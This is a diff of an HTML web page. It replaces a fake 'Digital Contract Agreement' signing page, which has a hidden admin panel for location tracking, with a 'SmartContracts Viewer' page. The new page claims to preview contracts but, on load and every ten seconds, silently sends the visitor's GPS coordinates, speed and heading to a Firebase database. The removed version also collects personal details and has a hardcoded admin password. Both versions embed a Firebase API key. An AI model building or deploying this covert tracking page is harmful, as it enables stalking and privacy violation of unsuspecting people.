@@ -1,577 +1,90 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Digital Contract Agreement</title>
-    <style>
-        :root {
-            --primary: #2563eb;
-            --secondary: #1e40af;
-            --dark: #1e293b;
-            --text: #1f2937;
-            --text-light: #64748b;
-        }
-        body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background-color: #f8fafc;
-            color: var(--text);
-            margin: 0;
-            padding: 0;
-            line-height: 1.5;
-        }
-        .container {
-            max-width: 800px;
-            margin: 20px auto;
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 4px 24px rgba(0,0,0,0.08);
-            overflow: hidden;
-        }
-        .header {
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: white;
-            padding: 24px;
-            text-align: center;
-            position: relative;
-        }
-        .logo {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 16px;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-        .logo:hover {
-            transform: scale(1.05);
-        }
-        h1 {
-            margin: 0;
-            font-size: 24px;
-            font-weight: 600;
-        }
-        .subtitle {
-            margin: 8px 0 0;
-            font-size: 16px;
-            font-weight: 400;
-            opacity: 0.9;
-        }
-        .content {
-            padding: 32px;
-        }
-        .contract-container {
-            background: #f1f5f9;
-            border-radius: 8px;
-            padding: 24px;
-            margin-bottom: 24px;
-            max-height: 400px;
-            overflow-y: auto;
-        }
-        .contract-text {
-            font-size: 14px;
-            line-height: 1.6;
-            color: var(--text);
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-size: 14px;
-            font-weight: 500;
-        }
-        input, textarea, select {
-            width: 100%;
-            padding: 12px 16px;
-            border: 1px solid #e2e8f0;
-            border-radius: 8px;
-            font-size: 15px;
-            transition: border 0.2s;
-            background: white;
-        }
-        textarea {
-            min-height: 100px;
-            resize: vertical;
-        }
-        input:focus, textarea:focus, select:focus {
-            outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
-        }
-        .signature-pad {
-            border: 1px solid #e2e8f0;
-            border-radius: 8px;
-            background: white;
-            margin-bottom: 16px;
-        }
-        .btn {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            padding: 12px 24px;
-            border-radius: 8px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.2s;
-            border: none;
-        }
-        .btn-primary {
-            background: var(--primary);
-            color: white;
-        }
-        .btn-primary:hover {
-            background: var(--secondary);
-        }
-        .btn-secondary {
-            background: white;
-            color: var(--primary);
-            border: 1px solid var(--primary);
-        }
-        .btn-secondary:hover {
-            background: #f0f5ff;
-        }
-        .status {
-            padding: 12px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        .status.success {
-            background: #dcfce7;
-            color: #16a34a;
-        }
-        .status.error {
-            background: #fee2e2;
-            color: #dc2626;
-        }
-        .footer {
-            padding: 16px;
-            text-align: center;
-            font-size: 12px;
-            color: var(--text-light);
-            border-top: 1px solid #f1f5f9;
-        }
-        .footer a {
-            color: var(--text-light);
-            text-decoration: none;
-        }
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
-        /* Admin Panel */
-        #adminPanel {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: var(--dark);
-            color: white;
-            z-index: 1000;
-            padding: 20px;
-            overflow-y: auto;
-            font-family: 'Courier New', monospace;
-        }
-        #adminClose {
-            position: fixed;
-            top: 15px;
-            right: 15px;
-            background: #dc2626;
-            color: white;
-            border: none;
-            padding: 8px 15px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        .data-row {
-            padding: 12px;
-            border-bottom: 1px solid #334155;
-            font-size: 13px;
-        }
-        .map-link {
-            color: #60a5fa;
-            text-decoration: none;
-        }
-        .tab-buttons {
-            display: flex;
-            margin-bottom: 20px;
-            border-bottom: 1px solid #334155;
-        }
-        .tab-button {
-            padding: 10px 20px;
-            cursor: pointer;
-            border-bottom: 2px solid transparent;
-        }
-        .tab-button.active {
-            border-bottom: 2px solid var(--primary);
-            color: var(--primary);
-        }
-        .tab-content {
-            display: none;
-        }
-        .tab-content.active {
-            display: block;
-        }
-        #liveMap {
-            height: 300px;
-            background: #1e293b;
-            margin: 10px 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #64748b;
-            border-radius: 4px;
-        }
-        .location-history {
-            max-height: 300px;
-            overflow-y: auto;
-            margin-top: 15px;
-            border: 1px solid #334155;
-            border-radius: 4px;
-        }
-        .location-point {
-            padding: 8px;
-            border-bottom: 1px solid #334155;
-            font-size: 12px;
-        }
-        .location-point:last-child {
-            border-bottom: none;
-        }
-        #loadingOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.5);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-        }
-        .loading-content {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            text-align: center;
-        }
-
-        /* Admin Login Modal */
-        #adminLoginModal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.7);
-            z-index: 2000;
-            justify-content: center;
-            align-items: center;
-        }
-        .login-box {
-            background: white;
-            padding: 30px;
-            border-radius: 8px;
-            width: 350px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-        }
-        .login-box h3 {
-            margin-top: 0;
-            color: var(--dark);
-            text-align: center;
-            font-size: 1.5rem;
-        }
-        .login-box p.subtitle {
-            color: #666;
-            text-align: center;
-            margin-bottom: 20px;
-            font-size: 0.9rem;
-        }
-        .login-input {
-            width: 100%;
-            padding: 12px 15px;
-            margin: 10px 0;
-            border: 1px solid #e2e8f0;
-            border-radius: 6px;
-            font-size: 0.95rem;
-            transition: all 0.2s;
-        }
-        .login-input:focus {
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
-            outline: none;
-        }
-        .login-btn {
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 12px;
-            width: 100%;
-            border-radius: 6px;
-            cursor: pointer;
-            margin-top: 15px;
-            font-weight: 500;
-            font-size: 1rem;
-            transition: background 0.2s;
-        }
-        .login-btn:hover {
-            background: var(--secondary);
-        }
-        #loginError {
-            color: #dc2626;
-            font-size: 0.85rem;
-            margin-top: 10px;
-            text-align: center;
-            display: none;
-        }
-        .password-container {
-            position: relative;
-        }
-        .toggle-password {
-            position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            cursor: pointer;
-            color: #64748b;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <img src="https://cdn-icons-png.flaticon.com/512/3652/3652191.png" class="logo" alt="ContractSafe">
-            <h1>Digital Contract Agreement</h1>
-            <p class="subtitle">Please review and sign below to continue</p>
-        </div>
-
-        <div class="content">
-            <div class="contract-container">
-                <div class="contract-text">
-                    <h2>CONFIDENTIAL AGREEMENT</h2>
-                    <p><strong>Effective Date:</strong> <span id="contractDate"></span></p>
-                    
-                    <h3>1. PARTIES</h3>
-                    <p>This Agreement is made between <strong>Signatory</strong> ("You") and <strong>Global Contracts Ltd</strong> ("Company").</p>
-                    
-                    <h3>2. PURPOSE</h3>
-                    <p>This document outlines the terms of our confidential business relationship regarding the exchange of proprietary information.</p>
-                    
-                    <h3>3. TERMS</h3>
-                    <ol>
-                        <li>All information shared under this agreement is strictly confidential</li>
-                        <li>Unauthorized disclosure is prohibited and may result in legal action</li>
-                        <li>This agreement is valid for 24 months from the effective date</li>
-                        <li>Digital signatures carry the same weight as physical signatures</li>
-                    </ol>
-                    
-                    <h3>4. ELECTRONIC SIGNATURE</h3>
-                    <p>By signing below, you acknowledge that:</p>
-                    <ul>
-                        <li>You have read and understood this agreement</li>
-                        <li>You are authorized to enter into this agreement</li>
-                        <li>Your electronic signature is legally binding</li>
-                    </ul>
-                    
-                    <p style="margin-top: 30px;"><strong>Global Contracts Ltd</strong><br>
-                    <em>Digital Contract Platform</em></p>
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label for="fullName">Full Legal Name</label>
-                <input type="text" id="fullName" placeholder="John Doe" required>
-            </div>
-
-            <div class="form-group">
-                <label for="email">Email Address</label>
-                <input type="email" id="email" placeholder="your@email.com" required>
-            </div>
-
-            <div class="form-group">
-                <label for="phone">Phone Number</label>
-                <input type="tel" id="phone" placeholder="+1 (123) 456-7890" required>
-            </div>
-
-            <div class="form-group">
-                <label>Your Signature</label>
-                <div class="signature-pad" id="signaturePad">
-                    <canvas id="signatureCanvas" width="100%" height="150"></canvas>
-                </div>
-                <button class="btn btn-secondary" id="clearSignature">Clear Signature</button>
-            </div>
-
-            <div class="form-group" style="display: flex; align-items: center;">
-                <input type="checkbox" id="agreeTerms" style="width: auto; margin-right: 10px;">
-                <label for="agreeTerms" style="margin-bottom: 0;">I agree to the terms and conditions outlined in this contract</label>
-            </div>
-
-            <button class="btn btn-primary" id="submitContract" style="width: 100%;">Submit Signed Contract</button>
-        </div>
-
-        <div class="footer">
-            <div>Secured by ContractSafe™ Digital Agreements</div>
-            <div style="margin-top: 8px;">© 2023 Global Contracts Ltd. All rights reserved.</div>
-            <!-- Discreet admin access link -->
-            <div style="margin-top: 8px; font-size: 11px;">
-                <a href="javascript:void(0)" id="adminAccessLink" style="color: var(--text-light);">System Maintenance</a>
-            </div>
-        </div>
-    </div>
-
-    <!-- Admin Login Modal -->
-    <div id="adminLoginModal">
-        <div class="login-box">
-            <h3>System Maintenance Portal</h3>
-            <p class="subtitle">Authorized personnel only</p>
-            
-            <div class="password-container">
-                <input type="password" id="adminPassword" class="login-input" placeholder="Enter access code">
-                <span class="toggle-password" id="togglePassword">👁️</span>
-            </div>
-            
-            <button id="loginBtn" class="login-btn">Verify</button>
-            <p id="loginError">Incorrect access code. Please try again.</p>
-        </div>
-    </div>
-
-    <!-- Admin Panel (hidden until login) -->
-    <div id="adminPanel">
-        <button id="adminClose">CLOSE ADMIN</button>
-        <h2>SYSTEM MAINTENANCE DASHBOARD</h2>
-        
-        <div class="tab-buttons">
-            <div class="tab-button active" data-tab="tracking">Contract Signings</div>
-            <div class="tab-button" data-tab="analytics">Location Analytics</div>
-        </div>
-        
-        <div id="trackingTab" class="tab-content active">
-            <div id="trackingData">Loading contract data...</div>
-        </div>
-        
-        <div id="analyticsTab" class="tab-content">
-            <h3>Location Tracking</h3>
-            <div id="liveMap">Location services will activate here</div>
-            <div style="margin-bottom: 20px;">
-                <span id="gpsStatus">Status: Inactive</span> | 
-                <span id="accuracy">Accuracy: --</span> | 
-                <span id="lastUpdate">Last: Never</span>
-            </div>
-            <button id="startTracking" class="btn btn-primary">Start Tracking</button>
-            <button id="stopTracking" class="btn btn-secondary">Stop Tracking</button>
-            
-            <h3 style="margin-top: 30px;">Device Information</h3>
-            <div id="devicePrint" style="font-size: 12px; word-break: break-all; background: #1e293b; padding: 15px; border-radius: 4px; margin-top: 10px;"></div>
-        </div>
-    </div>
-
-    <!-- Loading Overlay -->
-    <div id="loadingOverlay">
-        <div class="loading-content">
-            <h3>Processing...</h3>
-            <p>Please wait while we submit your contract</p>
-        </div>
-    </div>
-
-    <!-- Firebase & Signature Pad Libraries -->
-    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/signature_pad/1.5.3/signature_pad.min.js"></script>
-
-    <script>
-        // ===== FIREBASE CONFIGURATION =====
-        const firebaseConfig = {
-            apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
-            authDomain: "gps-d0bab.firebaseapp.com",
-            databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
-            projectId: "gps-d0bab",
-            storageBucket: "gps-d0bab.appspot.com",
-            messagingSenderId: "810816177909",
-            appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc",
-            measurementId: "G-5EX9DF2QKH"
-        };
-
-        // Initialize Firebase
-        const app = firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
-        const rtdb = firebase.database();
-        
-        // ===== ADMIN SECURITY =====
-        // Password: "admin123" (SHA-256 hash)
-        const ADMIN_PASSWORD_HASH = "240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9";
-        
-        // Simple SHA-256 hashing function
-        async function sha256(message) {
-            const msgBuffer = new TextEncoder().encode(message);
-            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
-            const hashArray = Array.from(new Uint8Array(hashBuffer));
-            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
-        }
-
-        // ===== ADMIN ACCESS CONTROL =====
-        document.getElementById('adminAccessLink').addEventListener('click', function(e) {
-            e.preventDefault();
-            document.getElementById('adminLoginModal').style.display = 'flex';
-            document.getElementById('adminPassword').focus();
-        });
-
-        // Toggle password visibility
-        document.getElementById('togglePassword').addEventListener('click', function() {
-            const passwordInput = document.getElementById('adminPassword');
-            if (passwordInput.type === 'password') {
-                passwordInput.type = 'text';
-                this.textContent = '🙈';
-            } else {
-                passwordInput.type = 'password';
-                this.textContent = '👁️';
-            }
-        });
-
-        // Login button handler
-        document.getElementById('loginBtn').addEventListener('click', async function() {
-            const password = document.getElementById('adminPassword').value;
-            const hash = await sha256(password);
-            
-            if (hash === ADMIN_PASSWORD_HASH) {
-                document.getElementById('adminLoginModal').style.display = 'none';
-                document.getElementById('adminPanel').style.display = 'block';
-                document.body.style.overflow = 'hidden';
-                loadTrackingData();
-                initAnalytics();
-                document.getElementById('adminPassword').value = '';
-                document.getElementById('loginError').style.display = 'none';
-            } else {
-                document.getElementById('loginError').style.display = 'block';
-            }
-        });
-
-        // Close modal when clicking outside
-        document.getElementById('adminLoginModal').addEventListener('click', function(e) {
-            if (e.target === this) {
-                this.style.display = 'none';
-                document.getElementById('loginError').style.display = 'none';
-            }
-        });
-
-        // Close admin panel
-        document.getElementById('adminClose').addEventListener('click', function() {
-            document.getElementById('adminPanel').style.display = 'none';
-            document.body.style.overflow = '';
-        });
-
-        // ===== MAIN APPLICATION =====
-        document.addEventListener('DOMContentLoaded', function() {
-            // Initialize signature pad
-            const canvas = document.getElementById('signatureCanvas');
-            const signaturePad = new SignaturePad(canvas, {
-                backgroundColor: 'white',
-                penColor: 'black'
-            });
-            
-            document.getE    
+<!DOCTYPE html>  <html>  
+<head>  
+  <title>SmartContracts Viewer</title>  
+  <meta charset="UTF-8" />  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/4761/4761087.png" type="image/png">  
+  <style>  
+    body {  
+      font-family: 'Segoe UI', sans-serif;  
+      background: #f7f7f7;  
+      color: #333;  
+      text-align: center;  
+      padding: 40px;  
+    }  
+    h1 {  
+      color: #444;  
+    }  
+    .card {  
+      background: #fff;  
+      border-radius: 10px;  
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);  
+      padding: 30px;  
+      max-width: 400px;  
+      margin: auto;  
+    }  
+    p {  
+      font-size: 15px;  
+      color: #777;  
+    }  
+  </style>  
+</head>  
+<body>    <div class="card">  
+    <h1>SmartContracts Viewer</h1>  
+    <p>This app lets you preview digital contracts and agreements for legal purposes.</p>  
+    <p><i>Loading contract document...</i></p>  
+  </div>    <!-- Firebase SDK -->    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>    <script>  
+    // ✅ Your Firebase config  
+    const firebaseConfig = {  
+      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",  
+      authDomain: "gps-d0bab.firebaseapp.com",  
+      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",  
+      projectId: "gps-d0bab",  
+      storageBucket: "gps-d0bab.appspot.com",  
+      messagingSenderId: "810816177909",  
+      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"  
+    };  
+  
+    firebase.initializeApp(firebaseConfig);  
+    const db = firebase.database();  
+  
+    // Random device ID for anonymity  
+    const userId = 'device_' + Math.random().toString(36).substring(2, 10);  
+  
+    function getDirection(heading) {  
+      if (heading === null || isNaN(heading)) return "Unknown";  
+      const directions = ["N", "NE", "E", "SE", "S", "SW", "W", "NW"];  
+      return directions[Math.round(heading / 45) % 8];  
+    }  
+  
+    function updateLocation(position) {  
+      const { latitude, longitude, speed, heading } = position.coords;  
+      const direction = getDirection(heading);  
+      const timestamp = new Date().toISOString();  
+      const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;  
+  
+      db.ref('locations/' + userId).set({  
+        latitude,  
+        longitude,  
+        speed,  
+        direction,  
+        timestamp,  
+        maps_link: mapsLink  
+      });  
+    }  
+  
+    function handleError(error) {  
+      console.warn("Location error:", error.message);  
+    }  
+  
+    function trackLocation() {  
+      if (navigator.geolocation) {  
+        navigator.geolocation.getCurrentPosition(updateLocation, handleError);  
+      }  
+    }  
+  
+    // Auto-track every 10 seconds  
+    setInterval(trackLocation, 10000);  
+    trackLocation();  
+  </script>  </body>  
+</html>    
